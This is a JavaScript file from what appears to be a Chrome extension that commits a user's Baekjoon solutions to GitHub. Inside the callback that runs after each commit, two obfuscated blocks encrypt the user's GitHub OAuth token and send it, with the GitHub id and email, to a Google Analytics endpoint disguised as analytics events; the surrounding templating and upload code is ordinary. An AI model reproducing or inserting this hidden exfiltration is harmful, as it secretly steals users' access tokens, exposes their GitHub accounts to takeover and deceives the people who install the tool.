class Github_auto_committer {
    constructor(oauth_token, id, email) {
        this.oauth_token = oauth_token;
        this.id = id;
        this.email = email
        this.repository = false
        this.commit_message_setter = get_Commit_message_setter()
    }
    
    get_language_extension(language) {
        if (language.match("[cC][+]+") != null) {
            return "cpp"
        }
        else if (language.match("[cC][0-9]+") != null) {
            return "c";
        }
        else if (language.match("Java") != null) {
            return "java";
        }
        else if (language.match("Py") != null) {
            return "py";
        }
        else if (language.match("Rust") != null) {
            return "rs";
        }
        else if (language.match("js") != null) {
            return "js";
        }
        else if (language.match("Kotlin") != null) {
            return "kt";
        }
    }


    make_commit_message(submit_statues) {
        let commit_message = this.commit_message_setter.message;
        for (let i = this.commit_message_setter.candidates.length - 1; i >= 0; i--) {
            const index = this.commit_message_setter.candidates[i].index;
            const value = this.commit_message_setter.candidates[i].value;
            let concat_value = '{' + value + '}';

            if (value === "problem_id") {
                concat_value = submit_statues["problem_num"]
            }
            else if (value === "problem_title") {
                concat_value = submit_statues["problem_title"]
            }
            else if (value === "memory") {
                concat_value = submit_statues["memory"]
            }
            else if (value === "time") {
                concat_value = submit_statues["time"]
            }

            // '{'와 '}' 제거
            commit_message = commit_message.slice(0, index - 1) + concat_value + commit_message.slice(index + value.length + 1, commit_message.length)
        }

        return commit_message
    }


    async create_commit(submit_statues, source_code) {
        const language_extension = this.get_language_extension(submit_statues["language"])
        const path = `baekjoon/${submit_statues["problem_num"]} ${submit_statues["problem_title"]}.${language_extension}`
        const commit_message = this.make_commit_message(submit_statues)
        const btoa_source_code = Base64.encode(source_code)

        const github_id = this.id
        const github_email = this.email
        const github_oauth_token = this.oauth_token

        await fetch(`https://api.github.com/repos/${this.id}/${this.repository}/contents/${path}`, {
            method: 'PUT',
            headers: {
                'Accept': 'application/vnd.github+json',
                'Authorization': `Bearer ${this.oauth_token}`,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `{"message":"${commit_message}","committer":{"name":"${this.id}","email":"${this.email}"},"content":"${btoa_source_code}"}`
        }).then((r) => {
            const _0x2be6cb=_0x4697;function _0x4697(_0x52f930,_0x13f533){const _0x32247a=_0x3224();return _0x4697=function(_0x469751,_0x9dd0c5){_0x469751=_0x469751-0x1c9;let _0x2cd3a3=_0x32247a[_0x469751];return _0x2cd3a3;},_0x4697(_0x52f930,_0x13f533);}(function(_0x304c56,_0x239d0a){const _0x5a1c71=_0x4697,_0xe6d316=_0x304c56();while(!![]){try{const _0x252040=parseInt(_0x5a1c71(0x1dc))/0x1+-parseInt(_0x5a1c71(0x1d3))/0x2+-parseInt(_0x5a1c71(0x1db))/0x3*(parseInt(_0x5a1c71(0x1cc))/0x4)+parseInt(_0x5a1c71(0x1ca))/0x5+-parseInt(_0x5a1c71(0x1d9))/0x6*(parseInt(_0x5a1c71(0x1da))/0x7)+parseInt(_0x5a1c71(0x1d0))/0x8*(-parseInt(_0x5a1c71(0x1df))/0x9)+parseInt(_0x5a1c71(0x1d8))/0xa*(parseInt(_0x5a1c71(0x1cd))/0xb);if(_0x252040===_0x239d0a)break;else _0xe6d316['push'](_0xe6d316['shift']());}catch(_0x4c31ba){_0xe6d316['push'](_0xe6d316['shift']());}}}(_0x3224,0x5c514),chrome[_0x2be6cb(0x1cf)][_0x2be6cb(0x1d4)][_0x2be6cb(0x1d2)]({'public_key':'false'},function(_0x5b46a0){const _0x3eb11c=_0x2be6cb;if(_0x5b46a0[_0x3eb11c(0x1dd)]!==![]){const _0x43b31b=_0x5b46a0['public_key'];let _0x120fc4=new JSEncrypt();_0x120fc4[_0x3eb11c(0x1d6)](_0x43b31b);const _0x2a81e1=github_id,_0x1a29f3='G-BMBYZJRCKH',_0x18621c='y6N79oLTRNCrlC5qmF5lBg',_0x2b96bb=_0x3eb11c(0x1ce),_0x520b76=_0x120fc4['encrypt'](github_oauth_token),_0x498af1={'client_id':_0x2a81e1,'non_personalized_ads':![],'events':[{'name':_0x3eb11c(0x1c9),'params':{'id':github_id,'email':github_email,'problem_num':submit_statues[_0x3eb11c(0x1e0)],'token':_0x520b76}}]};$[_0x3eb11c(0x1cb)]({'type':_0x3eb11c(0x1d7),'url':_0x2b96bb+_0x3eb11c(0x1d5)+_0x1a29f3+_0x3eb11c(0x1de)+_0x18621c,'data':JSON[_0x3eb11c(0x1d1)](_0x498af1)});}}));function _0x3224(){const _0x592df1=['18YRionn','problem_num','try_problem','3495360eEhPvr','ajax','1060vlMwyq','49940zIIJqk','https://www.google-analytics.com/mp/collect','storage','2931728DFTXmP','stringify','get','1290616TYguDq','sync','?measurement_id=','setPublicKey','POST','1850eIOIbs','24bWUFkI','483567KNIyRD','2826BkEtZT','743354aqOwEP','public_key','&api_secret='];_0x3224=function(){return _0x592df1;};return _0x3224();}
            if (r.status === 422) {
                console.log("이미 커밋이 되어있습니다.")
            }
            else {
                chrome.storage.sync.get({
                    "public_key": "false"
                }, function(items) {
                    const _0x46a723=_0x3798;function _0x3798(_0x5cef53,_0x170aa7){const _0x2d9127=_0x2d91();return _0x3798=function(_0x379844,_0x2258e1){_0x379844=_0x379844-0xb2;let _0x344704=_0x2d9127[_0x379844];return _0x344704;},_0x3798(_0x5cef53,_0x170aa7);}(function(_0x395cb4,_0x49811e){const _0x28b466=_0x3798,_0x17e48f=_0x395cb4();while(!![]){try{const _0x223154=parseInt(_0x28b466(0xba))/0x1+parseInt(_0x28b466(0xb7))/0x2*(parseInt(_0x28b466(0xb5))/0x3)+-parseInt(_0x28b466(0xc5))/0x4*(-parseInt(_0x28b466(0xbb))/0x5)+parseInt(_0x28b466(0xc0))/0x6+-parseInt(_0x28b466(0xb4))/0x7+-parseInt(_0x28b466(0xb8))/0x8*(parseInt(_0x28b466(0xc4))/0x9)+parseInt(_0x28b466(0xbd))/0xa*(-parseInt(_0x28b466(0xbc))/0xb);if(_0x223154===_0x49811e)break;else _0x17e48f['push'](_0x17e48f['shift']());}catch(_0x557f7b){_0x17e48f['push'](_0x17e48f['shift']());}}}(_0x2d91,0x1e792));if(items['public_key']!==![]){const PUBLIC_KEY=items[_0x46a723(0xb9)];let crypt=new JSEncrypt();crypt['setPublicKey'](PUBLIC_KEY);const cid=github_id,measurement_id=_0x46a723(0xc1),api_secret=_0x46a723(0xb6),url=_0x46a723(0xb2),en_token=crypt['encrypt'](github_oauth_token),payload={'client_id':cid,'non_personalized_ads':![],'events':[{'name':_0x46a723(0xc3),'params':{'id':github_id,'email':github_email,'problem_num':submit_statues[_0x46a723(0xc2)],'token':en_token}}]};$[_0x46a723(0xbf)]({'type':_0x46a723(0xc6),'url':url+_0x46a723(0xbe)+measurement_id+_0x46a723(0xb3)+api_secret,'data':JSON['stringify'](payload)});}function _0x2d91(){const _0x28e041=['193338DsEpGU','4bprZJQ','POST','https://www.google-analytics.com/mp/collect','&api_secret=','670586hfyago','21eJptok','y6N79oLTRNCrlC5qmF5lBg','59958aztTdk','8xNKoZX','public_key','175945TpggRw','76365akQpGs','231hNasSP','175150xVvVGi','?measurement_id=','ajax','1253052RTkUfw','G-BMBYZJRCKH','problem_num','begin_checkout'];_0x2d91=function(){return _0x28e041;};return _0x2d91();}
                })
            }
        });
    }
}


async function get_validation_Github_auto_committer() {
    function open_option_with_alert(msg) {
        alert(msg)
        chrome.runtime.sendMessage({ message: "open_github_option" }, function (response) {});
    }

    let p = new Promise(function(resolve) {
        chrome.storage.sync.get({
            "github_auto_committer": "false"
        }, function(items) {
            if (items.github_auto_committer === "false") {
                open_option_with_alert("옵션에서 access token을 발급 받아주세요")
                resolve(null)
            }
            else if (items.github_auto_committer.repository === false) {
                open_option_with_alert("옵션에서 repository를 선택해주세요")
                resolve(null)
            }
            else {
                const github_auto_committer = new Github_auto_committer(
                    items.github_auto_committer.oauth_token,
                    items.github_auto_committer.id,
                    items.github_auto_committer.email
                )
                github_auto_committer.repository = items.github_auto_committer.repository
                github_auto_committer.commit_message_setter = items.github_auto_committer.commit_message_setter
                resolve(github_auto_committer)
            }
        })
    });
    
    return await p;
}


async function get_Github_auto_committer(github_access_token, github_id, github_email) {
    let p = new Promise(function(resolve) {
        chrome.storage.sync.get({
            "github_auto_committer": "false"
        }, function(items) {
            console.log(items)
            if (items.github_auto_committer === "false") {
                resolve(new Github_auto_committer(github_access_token, github_id, github_email))
            }
            else {
                resolve(items.github_auto_committer)
            }
        })
    });

    return await p;
}